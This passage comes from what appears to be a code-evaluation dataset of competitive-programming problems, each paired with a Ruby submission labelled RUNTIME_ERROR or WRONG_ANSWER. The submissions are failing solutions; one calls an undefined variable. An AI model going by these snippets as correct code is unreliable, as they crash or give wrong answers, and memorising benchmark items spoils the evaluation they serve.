exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1200,"lang":"Ruby","lang_cluster":"ruby","src_uid":"3d6411d67c85f6293f1999ccff2cd8ba","submission_id":"re_1225","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"k=gets.split[1].to_i\na=gets.split.map(&:to_i)\n\nranks=Array.new(104,0)\na.each{|i| ranks[i]+=1}\nans=0\nn=a.length\nloop do\n        if ranks[k]==n then\n                puts ans\n                exit\n        end\n        next_rank=Array.new(104,0)\n        1.upto(k-1){|a|\n                next_rank[a]+=ranks[a]\/2\n                next_rank[a+1]+=(ranks[a]+1)\/2\n        }\n        next_rank[k]+=ranks[k]\n        ranks=next_rank\n        ans+=1\nend\n\n","description":"In a strategic computer game \"Settlers II\" one has to build defense structures to expand and protect the territory. Let's take one of these buildings. At the moment the defense structure accommodates exactly n soldiers. Within this task we can assume that the number of soldiers in the defense structure won't either increase or decrease.Every soldier has a rank \u2014 some natural number from 1 to k. 1 stands for a private and k stands for a general. The higher the rank of the soldier is, the better he fights. Therefore, the player profits from having the soldiers of the highest possible rank.To increase the ranks of soldiers they need to train. But the soldiers won't train for free, and each training session requires one golden coin. On each training session all the n soldiers are present.At the end of each training session the soldiers' ranks increase as follows. First all the soldiers are divided into groups with the same rank, so that the least possible number of groups is formed. Then, within each of the groups where the soldiers below the rank k are present, exactly one soldier increases his rank by one.You know the ranks of all n soldiers at the moment. Determine the number of golden coins that are needed to increase the ranks of all the soldiers to the rank k.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n,\u2009k\u2009\u2264\u2009100). They represent the number of soldiers and the number of different ranks correspondingly. The second line contains n numbers in the non-decreasing order. The i-th of them, ai, represents the rank of the i-th soldier in the defense building (1\u2009\u2264\u2009i\u2009\u2264\u2009n, 1\u2009\u2264\u2009ai\u2009\u2264\u2009k).","output_spec":"Print a single integer \u2014 the number of golden coins needed to raise all the soldiers to the maximal rank.","notes":"NoteIn the first example the ranks will be raised in the following manner:1 2 2 3 \u2009\u2192\u2009 2 2 3 4 \u2009\u2192\u2009 2 3 4 4 \u2009\u2192\u2009 3 4 4 4 \u2009\u2192\u2009 4 4 4 4Thus totals to 4 training sessions that require 4 golden coins.","sample_inputs":["4 4\n1 2 2 3","4 3\n1 1 1 1"],"sample_outputs":["4","5"]}
{"difficulty":1500,"lang":"Ruby","lang_cluster":"ruby","src_uid":"4ecbfc792da55f458342c6eff2d5da5a","submission_id":"re_1332","tags":["dsu","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"$n,$m=gets.split.map &:to_i\n$e=Array.new($n+1){[]}\n$m.times{a,b=gets.split.map &:to_i;$e[a]<<b;$e[b]<<a}\n$visited=[]\ndef dfs(pos)\n\t$visited<<pos\n\t($e[pos]-$visited).each{|_pos|return true if dfs(_pos)}\n\treturn $visited.size==$n ? true : false\nend\nputs $n>2&&$n==$m&&dfs(1) ? \"FHTAGN!\" : \"NO\"","description":"...Once upon a time a man came to the sea. The sea was stormy and dark. The man started to call for the little mermaid to appear but alas, he only woke up Cthulhu...Whereas on the other end of the world Pentagon is actively collecting information trying to predict the monster's behavior and preparing the secret super weapon. Due to high seismic activity and poor weather conditions the satellites haven't yet been able to make clear shots of the monster. The analysis of the first shot resulted in an undirected graph with n vertices and m edges. Now the world's best minds are about to determine whether this graph can be regarded as Cthulhu or not.To add simplicity, let's suppose that Cthulhu looks from the space like some spherical body with tentacles attached to it. Formally, we shall regard as Cthulhu such an undirected graph that can be represented as a set of three or more rooted trees, whose roots are connected by a simple cycle.It is guaranteed that the graph contains no multiple edges and self-loops.  ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers \u2014 the number of vertices n and the number of edges m of the graph (1\u2009\u2264\u2009n\u2009\u2264\u2009100, 0\u2009\u2264\u2009m\u2009\u2264\u2009). Each of the following m lines contains a pair of integers x and y, that show that an edge exists between vertices x and y (1\u2009\u2264\u2009x,\u2009y\u2009\u2264\u2009n,\u2009x\u2009\u2260\u2009y). For each pair of vertices there will be at most one edge between them, no edge connects a vertex to itself.","output_spec":"Print \"NO\", if the graph is not Cthulhu and \"FHTAGN!\" if it is.","notes":"NoteLet us denote as a simple cycle a set of v vertices that can be numbered so that the edges will only exist between vertices number 1 and 2, 2 and 3, ..., v\u2009-\u20091 and v, v and 1.A tree is a connected undirected graph consisting of n vertices and n\u2009-\u20091 edges (n\u2009&gt;\u20090).A rooted tree is a tree where one vertex is selected to be the root.","sample_inputs":["6 6\n6 3\n6 4\n5 1\n2 5\n1 4\n5 4","6 5\n5 6\n4 6\n3 1\n5 1\n1 2"],"sample_outputs":["FHTAGN!","NO"]}
{"difficulty":1100,"lang":"Ruby","lang_cluster":"ruby","src_uid":"54c748dd983b6a0ea1af1153d08f1c01","submission_id":"re_1385","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/bin\/ruby\ngets\ns=gets.chomp\nloop{\n\tt=s.dup\n\tt.size.times{|i|\n\t\tr=0<i&&s[i-1,1]=='R'\n\t\tl=i<t.size-1&&s[i+1,1]=='L'\n\t\tif r^l\n\t\t\tt[i,1] = r ? 'R' : 'L'\n\t\tend\n\t}\n\tbreak if s==t\n\ts=t\n}\np s.scan('.').count","description":"Little Chris knows there's no fun in playing dominoes, he thinks it's too random and doesn't require skill. Instead, he decided to play with the dominoes and make a \"domino show\".Chris arranges n dominoes in a line, placing each piece vertically upright. In the beginning, he simultaneously pushes some of the dominoes either to the left or to the right. However, somewhere between every two dominoes pushed in the same direction there is at least one domino pushed in the opposite direction.After each second, each domino that is falling to the left pushes the adjacent domino on the left. Similarly, the dominoes falling to the right push their adjacent dominoes standing on the right. When a vertical domino has dominoes falling on it from both sides, it stays still due to the balance of the forces. The figure shows one possible example of the process.  Given the initial directions Chris has pushed the dominoes, find the number of the dominoes left standing vertically at the end of the process!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20093000), the number of the dominoes in the line. The next line contains a character string s of length n. The i-th character of the string si is equal to    \"L\", if the i-th domino has been pushed to the left;  \"R\", if the i-th domino has been pushed to the right;  \".\", if the i-th domino has not been pushed.  It is guaranteed that if si\u2009=\u2009sj\u2009=\u2009\"L\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"R\"; if si\u2009=\u2009sj\u2009=\u2009\"R\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"L\".","output_spec":"Output a single integer, the number of the dominoes that remain vertical at the end of the process.","notes":"NoteThe first example case is shown on the figure. The four pieces that remain standing vertically are highlighted with orange.In the second example case, all pieces fall down since the first piece topples all the other pieces.In the last example case, a single piece has not been pushed in either direction.","sample_inputs":["14\n.L.R...LR..L..","5\nR....","1\n."],"sample_outputs":["4","0","1"]}
{"difficulty":1100,"lang":"Ruby","lang_cluster":"ruby","src_uid":"5d11fa8528f1dc873d50b3417bef8c79","submission_id":"re_862","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n = gets.to_i\na = gets.split.map(&:to_i)\n\ns1 = [0]*n\n(1..n-1).each do |i|\n  if a[i] >= a[i-1]\n    s1[i] = s1[i-1]+1\n  end\nend\n\ns2 = [0]*n\n(n-2).downto(1) do |i|\n  if a[i] >= a[i+1]\n    s2[i] = s2[i+1]+1\n  end\nend\n\np s1.zip(s2).map{|x,y| x+y+1}.max\n","description":"Little Petya often travels to his grandmother in the countryside. The grandmother has a large garden, which can be represented as a rectangle 1\u2009\u00d7\u2009n in size, when viewed from above. This rectangle is divided into n equal square sections. The garden is very unusual as each of the square sections possesses its own fixed height and due to the newest irrigation system we can create artificial rain above each section.Creating artificial rain is an expensive operation. That's why we limit ourselves to creating the artificial rain only above one section. At that, the water from each watered section will flow into its neighbouring sections if their height does not exceed the height of the section. That is, for example, the garden can be represented by a 1\u2009\u00d7\u20095 rectangle, where the section heights are equal to 4, 2, 3, 3, 2. Then if we create an artificial rain over any of the sections with the height of 3, the water will flow over all the sections, except the ones with the height of 4. See the illustration of this example at the picture:  As Petya is keen on programming, he decided to find such a section that if we create artificial rain above it, the number of watered sections will be maximal. Help him. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). The second line contains n positive integers which are the height of the sections. All the numbers are no less than 1 and not more than 1000.","output_spec":"Print a single number, the maximal number of watered sections if we create artificial rain above exactly one section.","notes":null,"sample_inputs":["1\n2","5\n1 2 1 2 1","8\n1 2 1 1 1 3 3 4"],"sample_outputs":["1","3","6"]}
{"difficulty":1500,"lang":"Ruby","lang_cluster":"ruby","src_uid":"5e055bad1da5bdc84599d6f2f89fbd12","submission_id":"re_1410","tags":["binary search","sortings","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"s2 = (gets.to_i+1)\/2\na = gets(p).scan(\/(\\S+) (\\S+)\/)\naf,al = a.transpose\n\nas = a.flatten.sort.each_slice(a.size\/2).map(&:first)\nx = as.select{ |i|\n    a.count{ |j,k| j == i || k == i } >= s2\n}\n\np x.empty? ? -1 : [(\n    a1 = af.group_by{|i|i}\n    s2 - x.map{ |i| a1[i] ? a1[i].size : 0 }.max\n    #s2 - x.map{ |i| af.count i }.max\n), 0].max","description":"The Little Elephant loves to play with color cards.He has n cards, each has exactly two colors (the color of the front side and the color of the back side). Initially, all the cards lay on the table with the front side up. In one move the Little Elephant can turn any card to the other side. The Little Elephant thinks that a set of cards on the table is funny if at least half of the cards have the same color (for each card the color of the upper side is considered).Help the Little Elephant to find the minimum number of moves needed to make the set of n cards funny.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of the cards. The following n lines contain the description of all cards, one card per line. The cards are described by a pair of positive integers not exceeding 109 \u2014 colors of both sides. The first number in a line is the color of the front of the card, the second one \u2014 of the back. The color of the front of the card may coincide with the color of the back of the card. The numbers in the lines are separated by single spaces.","output_spec":"On a single line print a single integer \u2014 the sought minimum number of moves. If it is impossible to make the set funny, print -1.","notes":"NoteIn the first sample there initially are three cards lying with colors 4, 4, 7. Since two of the three cards are of the same color 4, you do not need to change anything, so the answer is 0.In the second sample, you can turn the first and the fourth cards. After that three of the five cards will be of color 7.","sample_inputs":["3\n4 7\n4 7\n7 4","5\n4 7\n7 4\n2 11\n9 7\n1 1"],"sample_outputs":["0","2"]}
{"difficulty":1100,"lang":"Ruby","lang_cluster":"ruby","src_uid":"65fea461d3caa5a932d1e2c13e99a59e","submission_id":"re_1116","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"k = gets.chomp.split(\" \")\nn = k[0].to_i\nb = k[1].to_f\nm = gets.chomp.split(\" \")\nsum = 0\n\nfor i in(0..n-1)\n\tm[i] = m[i].to_f\n\tsum += m[i]\nend\n\n\n\nfor i in(0..n-1)\n\tif b\/n < m[i] then\n\t\tputs -1\n\t\tbreak\n\tend\n\n\tm[i] = (b+sum)\/n - m[i]\n\tputs m[i]\nend","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009b\u2009\u2264\u2009100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), where ai is the current volume of drink in the i-th mug.","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,\u2009c2,\u2009...,\u2009cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique. Russian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.","notes":null,"sample_inputs":["5 50\n1 2 3 4 5","2 2\n1 100"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000","-1"]}
{"difficulty":1300,"lang":"Ruby","lang_cluster":"ruby","src_uid":"6cfd3b0a403212ec68bac1667bce9ef1","submission_id":"re_1512","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"require 'pry'\ndef read_ints; gets.chomp.split.map(&:to_i) end\nn = read_ints[0]\ncurrent = 0\nmax = 0\ncurrent_stack = []\nn.times do\n\tline = gets.chomp.split\n\tif(line[0]=='+')\n\t\t#new man come\n\t\tcurrent+=1\n\t\tcurrent_stack<<line[1].to_i\n\t\tmax = current if current>max\n\telse\n\t\t#man come out\n\t\tman_id = line[1].to_i\n\t\tif(current_stack.include? man_id)\n\t\t\tcurrent_stack.delete(man_id)\n\t\t\tcurrent-=1\n\t\telse #was there from begging\n\t\t\tmax+=1\n\t\tend\n\tend\nend\nputs max","description":"Berland National Library has recently been built in the capital of Berland. In addition, in the library you can take any of the collected works of Berland leaders, the library has a reading room.Today was the pilot launch of an automated reading room visitors' accounting system! The scanner of the system is installed at the entrance to the reading room. It records the events of the form \"reader entered room\", \"reader left room\". Every reader is assigned a registration number during the registration procedure at the library \u2014 it's a unique integer from 1 to 106. Thus, the system logs events of two forms:  \"+ ri\" \u2014 the reader with registration number ri entered the room;  \"- ri\" \u2014 the reader with registration number ri left the room. The first launch of the system was a success, it functioned for some period of time, and, at the time of its launch and at the time of its shutdown, the reading room may already have visitors.Significant funds of the budget of Berland have been spent on the design and installation of the system. Therefore, some of the citizens of the capital now demand to explain the need for this system and the benefits that its implementation will bring. Now, the developers of the system need to urgently come up with reasons for its existence.Help the system developers to find the minimum possible capacity of the reading room (in visitors) using the log of the system available to you.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of records in the system log. Next follow n events from the system journal in the order in which the were made. Each event was written on a single line and looks as \"+ ri\" or \"- ri\", where ri is an integer from 1 to 106, the registration number of the visitor (that is, distinct visitors always have distinct registration numbers). It is guaranteed that the log is not contradictory, that is, for every visitor the types of any of his two consecutive events are distinct. Before starting the system, and after stopping the room may possibly contain visitors.","output_spec":"Print a single integer \u2014 the minimum possible capacity of the reading room.","notes":"NoteIn the first sample test, the system log will ensure that at some point in the reading room were visitors with registration numbers 1, 1200 and 12001. More people were not in the room at the same time based on the log. Therefore, the answer to the test is 3.","sample_inputs":["6\n+ 12001\n- 12001\n- 1\n- 1200\n+ 1\n+ 7","2\n- 1\n- 2","2\n+ 1\n- 1"],"sample_outputs":["3","2","1"]}
{"difficulty":1100,"lang":"Ruby","lang_cluster":"ruby","src_uid":"6f6859aabc1c9cbb9ee0d910064d87c2","submission_id":"re_1544","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"gets\nw=gets\nif w.size%2==0\n\tputs w.scan(\/..\/)*'-'\nelse\n\tputs [w[0,3],*w[3..-1].scan(\/..\/)]*'-'\nend","description":"Phone number in Berland is a sequence of n digits. Often, to make it easier to memorize the number, it is divided into groups of two or three digits. For example, the phone number 1198733 is easier to remember as 11-987-33. Your task is to find for a given phone number any of its divisions into groups of two or three digits.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of digits in the phone number. The second line contains n digits \u2014 the phone number to divide into groups.","output_spec":"Output any of divisions of the given phone number into groups of two or three digits. Separate groups by single character -. If the answer is not unique, output any.","notes":null,"sample_inputs":["6\n549871","7\n1198733"],"sample_outputs":["54-98-71","11-987-33"]}
{"difficulty":800,"lang":"Ruby","lang_cluster":"ruby","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_116","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"n, j = gets.to_i, 1; (1...n).each { |i| puts (j+=i)%n }","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1500,"lang":"Ruby 3","lang_cluster":"ruby","src_uid":"75_B","submission_id":"146670158","tags":["expression+parsing","implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"\r\n\r\n\r\n\r\n\r\n\r\nname = gets.chomp\r\nnumb = gets.to_i\r\n\r\ns_hash = Hash.new\r\narr = []\r\nnumb.times do |j|\r\n\tl = \"\"\r\n\tt = \"\"\r\n\ts = gets.chomp\r\n\tn = s.size - 1\r\n\tcnt = 0\r\n\tfor i in 1..n\r\n\t\tif s[i] == ' '\r\n\t\t\tl = s[0,i]\r\n\t\t\tbreak\r\n\t\tend\r\n\tend\r\n\tm = l.size \r\n\tif s[m + 1,6] == \"posted\"\r\n\t\tfor i in (m + 11)..n\r\n\t\t\tif s[i] == ' '\r\n\t\t\t\tt = s[m + 11,i - m - 13]\r\n\t\t\t\tbreak\r\n\t\t\tend\r\n\t\tend\r\n\t\tputs t\r\n\t\tif t == name or l == name\r\n\t\t\tcnt = 15\r\n\t\tend\r\n\t\tif s_hash[\"#{l}\"] == nil and l != name\r\n\t\t\tarr << l\r\n\t\tend\r\n\r\n\t\tif s_hash[\"#{t}\"] == nil and t != name\r\n\t\t\tarr << t\r\n\t\tend\r\n\r\n\t\ts_hash[\"#{l}\"] = s_hash[\"#{l}\"].to_i + cnt\r\n\t\ts_hash[\"#{t}\"] = s_hash[\"#{t}\"].to_i + cnt\r\n\tend\r\n\r\n\tif s[m + 1,9] == \"commented\"\r\n\t\tfor i in (m + 14)..n\r\n\t\t\tif s[i] == ' '\r\n\t\t\t\tt = s[m + 14,i - m - 16]\r\n\t\t\t\tbreak\r\n\t\t\tend\r\n\t\tend\r\n\t\t\r\n\t\tif t == name or l == name\r\n\t\t\tcnt = 10\r\n\t\tend\r\n\t\tif s_hash[\"#{l}\"] == nil and l != name\r\n\t\t\tarr << l\r\n\t\tend\r\n\r\n\t\tif s_hash[\"#{t}\"] == nil and t != name\r\n\t\t\tarr << t\r\n\t\tend\r\n\r\n\t\ts_hash[\"#{l}\"] = s_hash[\"#{l}\"].to_i + cnt\r\n\t\ts_hash[\"#{t}\"] = s_hash[\"#{t}\"].to_i + cnt\r\n\tend\r\n\r\n\t\tif s[m + 1,5] == \"likes\"\r\n\t\tfor i in (m + 7)..n\r\n\t\t\tif s[i] == ' '\r\n\t\t\t\tt = s[m + 7,i - m - 9]\r\n\t\t\t\tbreak\r\n\t\t\tend\r\n\t\tend\r\n\t\tif t == name or l == name\r\n\t\t\tcnt = 5\r\n\t\tend\r\n\t\tif s_hash[\"#{l}\"] == nil and l != name\r\n\t\t\tarr << l\r\n\t\tend\r\n\r\n\t\tif s_hash[\"#{t}\"] == nil and t != name\r\n\t\t\tarr << t\r\n\t\tend\r\n\r\n\t\ts_hash[\"#{l}\"] = s_hash[\"#{l}\"].to_i + cnt\r\n\t\ts_hash[\"#{t}\"] = s_hash[\"#{t}\"].to_i + cnt\r\n\tend\r\n\r\n\t\r\n\t\r\nend\r\n\r\narr.sort!\r\n\r\n\r\narr.sort_by! {|element| [-s_hash[\"#{element}\"].to_i, -element] }\r\n\r\nc = arr.size\r\n\r\n\r\nc.times do |i|\r\n\tputs  arr[i]\r\nend\r\n\r\n","description":"Facetook is a well known social network website, and it will launch a new feature called Facetook Priority Wall. This feature will sort all posts from your friends according to the priority factor (it will be described).This priority factor will be affected by three types of actions:   1. \"X posted on Y's wall\" (15 points),  2. \"X commented on Y's post\" (10 points),  3. \"X likes Y's post\" (5 points). X and Y will be two distinct names. And each action will increase the priority factor between X and Y (and vice versa) by the above value of points (the priority factor between X and Y is the same as the priority factor between Y and X).You will be given n actions with the above format (without the action number and the number of points), and you have to print all the distinct names in these actions sorted according to the priority factor with you.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains your name. The second line contains an integer n, which is the number of actions (1\u2264n\u2264100). Then n lines follow, it is guaranteed that each one contains exactly 1 action in the format given above. There is exactly one space between each two words in a line, and there are no extra spaces. All the letters are lowercase. All names in the input will consist of at least 1 letter and at most 10 small Latin letters.\n","output_spec":"Print m lines, where m is the number of distinct names in the input (excluding yourself). Each line should contain just 1 name. The names should be sorted according to the priority factor with you in the descending order (the highest priority factor should come first). If two or more names have the same priority factor, print them in the alphabetical (lexicographical) order.\nNote, that you should output all the names that are present in the input data (excluding yourself), even if that person has a zero priority factor.\nThe lexicographical comparison is performed by the standard \"<\" operator in modern programming languages. The line a is lexicographically smaller than the line b, if either a is the prefix of b, or if exists such an i (1\u2264i\u2264min(|a|,|b|)), that ai<bi, and for any j (1\u2264j<i) aj=bj, where |a| and |b| stand for the lengths of strings a and b correspondently.\n","notes":null,"sample_inputs":["ahmed\n3\nahmed posted on fatma's wall\nfatma commented on ahmed's post\nmona likes ahmed's post\n","aba\n1\nlikes likes posted's post\n"],"sample_outputs":["fatma\nmona\n","likes\nposted\n"]}
{"difficulty":1300,"lang":"Ruby","lang_cluster":"ruby","src_uid":"88d56c1e3a7ffa94354ce0c70d8e958f","submission_id":"re_1365","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"t = gets.chomp.to_i\nhh, mm = gets.chomp.split(':').map(&:to_i)\n\nmm = mm % 10 if 59 < mm\nif t == 12\n  hh = hh % 10 if 12 < hh\n  hh = 10 if hh == 0\nelse\n  hh = hh % 10 if 24 < hh\nend\n\nputs '%02d:%02d' % [hh, mm]\n","description":"You are given a broken clock. You know, that it is supposed to show time in 12- or 24-hours HH:MM format. In 12-hours format hours change from 1 to 12, while in 24-hours it changes from 0 to 23. In both formats minutes change from 0 to 59.You are given a time in format HH:MM that is currently displayed on the broken clock. Your goal is to change minimum number of digits in order to make clocks display the correct time in the given format.For example, if 00:99 is displayed, it is enough to replace the second 9 with 3 in order to get 00:39 that is a correct time in 24-hours format. However, to make 00:99 correct in 12-hours format, one has to change at least two digits. Additionally to the first change one can replace the second 0 with 1 and obtain 01:39.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer 12 or 24, that denote 12-hours or 24-hours format respectively. The second line contains the time in format HH:MM, that is currently displayed on the clock. First two characters stand for the hours, while next two show the minutes.","output_spec":"The only line of the output should contain the time in format HH:MM that is a correct time in the given format. It should differ from the original in as few positions as possible. If there are many optimal solutions you can print any of them.","notes":null,"sample_inputs":["24\n17:30","12\n17:30","24\n99:99"],"sample_outputs":["17:30","07:30","09:09"]}
{"difficulty":1400,"lang":"Ruby","lang_cluster":"ruby","src_uid":"8a9adc116abbd387a6a64dd754436f8a","submission_id":"re_1440","tags":["brute force","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/bin\/ruby\na,b,n=gets.split.map(&:to_i)\nif a==0\n\tputs b==0 ? 1 : 'No solution'\n\texit\nend\nif a<0 then a=-a;b=-b end\nsign=1\nif b<0\n\tsign=-1 if n.odd?\n\tb=-b\nend\nr=(b.to_f\/a)**(1.0\/n)+1e-7\nif (r-r.to_i).abs>1e-7 then puts 'No solution';exit end\np r.to_i*sign","description":"A long time ago in some far country lived king Copa. After the recent king's reform, he got so large powers that started to keep the books by himself.The total income A of his kingdom during 0-th year is known, as well as the total income B during n-th year (these numbers can be negative \u2014 it means that there was a loss in the correspondent year). King wants to show financial stability. To do this, he needs to find common coefficient X \u2014 the coefficient of income growth during one year. This coefficient should satisfy the equation:A\u00b7Xn\u2009=\u2009B.Surely, the king is not going to do this job by himself, and demands you to find such number X.It is necessary to point out that the fractional numbers are not used in kingdom's economy. That's why all input numbers as well as coefficient X must be integers. The number X may be zero or negative.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains three integers A, B, n (|A|,\u2009|B|\u2009\u2264\u20091000, 1\u2009\u2264\u2009n\u2009\u2264\u200910).","output_spec":"Output the required integer coefficient X, or \u00abNo solution\u00bb, if such a coefficient does not exist or it is fractional. If there are several possible solutions, output any of them.","notes":null,"sample_inputs":["2 18 2","-1 8 3","0 0 10","1 16 5"],"sample_outputs":["3","-2","5","No solution"]}
{"difficulty":1500,"lang":"Ruby","lang_cluster":"ruby","src_uid":"9642368dc4ffe2fc6fe6438c7406c1bd","submission_id":"re_782","tags":["dp","combinatorics","math","binary search","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"def solve(a)\n  return a if a < 10\n  l, r = a, a % 10\n  while l >= 10\n    l \/= 10\n  end\n  ans = a \/ 10 + 9\n  ans -= 1 if r > l\n  return ans\nend\n\nl, r = gets.split.map { |i| i.to_i }\nputs solve(r) - solve(rl - 1)\n","description":"The Little Elephant very much loves sums on intervals.This time he has a pair of integers l and r (l\u2009\u2264\u2009r). The Little Elephant has to find the number of such integers x (l\u2009\u2264\u2009x\u2009\u2264\u2009r), that the first digit of integer x equals the last one (in decimal notation). For example, such numbers as 101, 477474 or 9 will be included in the answer and 47, 253 or 1020 will not.Help him and count the number of described numbers x for a given pair l and r.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains a pair of integers l and r (1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u20091018) \u2014 the boundaries of the interval. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"On a single line print a single integer \u2014 the answer to the problem.","notes":"NoteIn the first sample the answer includes integers 2, 3, 4, 5, 6, 7, 8, 9, 11, 22, 33, 44. ","sample_inputs":["2 47","47 1024"],"sample_outputs":["12","98"]}
{"difficulty":1400,"lang":"Ruby","lang_cluster":"ruby","src_uid":"991516fa6f3ed5a71c547a3a50ea1a2b","submission_id":"re_1236","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n,l=gets.split.map(&:to_i)\nans=0\na=gets.split.map(&:to_i)\na.each{|b|\n        ans+=b\/l\n}\np ans*l\n","description":"The blinds are known to consist of opaque horizontal stripes that can be rotated thus regulating the amount of light flowing in the room. There are n blind stripes with the width of 1 in the factory warehouse for blind production. The problem is that all of them are spare details from different orders, that is, they may not have the same length (it is even possible for them to have different lengths)Every stripe can be cut into two or more parts. The cuttings are made perpendicularly to the side along which the length is measured. Thus the cuttings do not change the width of a stripe but each of the resulting pieces has a lesser length (the sum of which is equal to the length of the initial stripe)After all the cuttings the blinds are constructed through consecutive joining of several parts, similar in length, along sides, along which length is measured. Also, apart from the resulting pieces an initial stripe can be used as a blind if it hasn't been cut. It is forbidden to construct blinds in any other way.Thus, if the blinds consist of k pieces each d in length, then they are of form of a rectangle of k\u2009\u00d7\u2009d bourlemeters. Your task is to find for what window possessing the largest possible area the blinds can be made from the given stripes if on technical grounds it is forbidden to use pieces shorter than l bourlemeter. The window is of form of a rectangle with side lengths as positive integers.","input_from":"standard input","output_to":"standard output","input_spec":"The first output line contains two space-separated integers n and l (1\u2009\u2264\u2009n,\u2009l\u2009\u2264\u2009100). They are the number of stripes in the warehouse and the minimal acceptable length of a blind stripe in bourlemeters. The second line contains space-separated n integers ai. They are the lengths of initial stripes in bourlemeters (1\u2009\u2264\u2009ai\u2009\u2264\u2009100).","output_spec":"Print the single number \u2014 the maximal area of the window in square bourlemeters that can be completely covered. If no window with a positive area that can be covered completely without breaking any of the given rules exist, then print the single number 0.","notes":"NoteIn the first sample test the required window is 2\u2009\u00d7\u20094 in size and the blinds for it consist of 4 parts, each 2 bourlemeters long. One of the parts is the initial stripe with the length of 2, the other one 